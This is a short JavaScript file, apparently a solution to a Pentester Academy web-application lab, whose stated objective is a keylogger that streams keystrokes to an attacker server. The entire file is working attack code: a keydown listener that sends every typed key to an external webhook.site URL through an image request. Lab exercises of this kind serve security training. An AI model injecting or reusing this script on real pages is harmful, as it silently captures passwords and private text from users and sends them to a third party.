// https://pentesteracademylab.appspot.com/lab/webapp/jfp/7

// Objectives:
    // Create a KeyLogger which posts Keystrokes live to an attacker server



document.addEventListener('keydown', function (event){
    var key = event.key;
    var img = new Image().src = 'https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57/?key='+key;
}, false);